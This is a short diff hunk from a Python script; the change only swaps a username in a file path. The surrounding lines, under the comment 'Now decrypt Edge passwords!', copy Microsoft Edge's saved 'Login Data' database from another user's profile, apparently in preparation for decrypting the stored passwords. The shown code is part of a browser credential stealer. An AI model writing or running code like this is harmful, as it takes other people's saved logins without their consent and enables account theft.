@@ -69,7 +69,7 @@ if result:
             # Now decrypt Edge passwords!
             import sqlite3
             
-            db_path = r"C:\Users\BASEDGOD\Desktop\login_data_copy.db"
+            db_path = r"C:\Users\sirch\Desktop\login_data_copy.db"
             if not os.path.exists(db_path):
                 import shutil
                 shutil.copy(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", db_path)
